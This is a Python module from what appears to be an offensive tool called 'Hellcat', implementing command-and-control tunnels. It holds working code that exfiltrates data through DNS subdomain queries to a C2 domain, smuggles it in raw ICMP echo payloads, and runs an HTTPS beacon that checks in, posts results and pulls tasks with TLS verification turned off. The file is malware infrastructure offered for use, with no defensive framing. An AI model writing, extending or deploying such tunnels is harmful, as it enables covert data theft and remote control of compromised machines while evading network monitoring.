"""
Hellcat C2 Tunnel Implementations
===================================
DNS, ICMP, HTTPS concrete tunnels for beacon communication.
"""
from __future__ import annotations

import base64
import logging
import socket
import struct
import time
from typing import Any, Optional

from hellcat.core.c2 import BaseTunnel, C2Config

logger = logging.getLogger("hellcat.tunnels")


class DNSTunnel(BaseTunnel):
    """Exfiltrate data via DNS subdomain queries."""
    def __init__(self, config: C2Config) -> None:
        super().__init__(config)
        self._domain = config.domain or "c2.example.com"

    def connect(self) -> bool:
        self._connected = True
        return True

    def disconnect(self) -> None:
        self._connected = False

    def send(self, data: bytes) -> bool:
        try:
            encoded = base64.b32encode(data).decode().rstrip("=").lower()
            for i in range(0, len(encoded), 50):
                label = encoded[i:i+50]
                try:
                    socket.getaddrinfo(f"{label}.{i//50}.{self._domain}", None)
                except socket.gaierror:
                    pass
            return True
        except Exception as exc:
            logger.error("DNS send: %s", exc)
            return False

    def receive(self, timeout: Optional[float] = None) -> Optional[bytes]:
        return None  # DNS receive requires custom NS server


class ICMPTunnel(BaseTunnel):
    """Data exfil via ICMP echo payload. Requires root."""
    ICMP_ECHO = 8

    def connect(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self._sock.settimeout(self.config.timeout)
            self._connected = True
            return True
        except PermissionError:
            logger.error("ICMP requires root")
            return False

    def disconnect(self) -> None:
        if hasattr(self, "_sock") and self._sock:
            self._sock.close()
        self._connected = False

    def send(self, data: bytes) -> bool:
        if not hasattr(self, "_sock"):
            return False
        try:
            hdr = struct.pack("!BBHHH", self.ICMP_ECHO, 0, 0, 0x1337, 1)
            chk = sum(hdr[i] << (8 * (1 - i % 2)) for i in range(len(hdr)))
            chk = (~((chk >> 16) + (chk & 0xffff)) & 0xffff)
            hdr = struct.pack("!BBHHH", self.ICMP_ECHO, 0, chk, 0x1337, 1)
            self._sock.sendto(hdr + data, (self.config.server, 0))
            return True
        except Exception:
            return False

    def receive(self, timeout: Optional[float] = None) -> Optional[bytes]:
        try:
            self._sock.settimeout(timeout or 5)
            raw, _ = self._sock.recvfrom(65535)
            return raw[28:] if len(raw) > 28 else None
        except Exception:
            return None


class HTTPSTunnel(BaseTunnel):
    """HTTPS beacon tunnel using standard HTTP requests."""
    def __init__(self, config: C2Config) -> None:
        super().__init__(config)
        self._session: Any = None

    def connect(self) -> bool:
        try:
            import requests
            self._session = requests.Session()
            self._session.verify = False
            self._session.headers["User-Agent"] = self.config.user_agent
            resp = self._session.get(f"{self.config.get_base_url()}{self.config.checkin_path}", timeout=10)
            self._connected = resp.status_code == 200
            return self._connected
        except Exception:
            return False

    def disconnect(self) -> None:
        self._connected = False

    def send(self, data: bytes) -> bool:
        if not self._session:
            return False
        try:
            r = self._session.post(f"{self.config.get_base_url()}{self.config.result_path}",
                                   data=data, timeout=10)
            return r.status_code == 200
        except Exception:
            return False

    def receive(self, timeout: Optional[float] = None) -> Optional[bytes]:
        if not self._session:
            return None
        try:
            r = self._session.get(f"{self.config.get_base_url()}{self.config.task_path}", timeout=timeout or 10)
            return r.content if r.status_code == 200 and r.content else None
        except Exception:
            return None
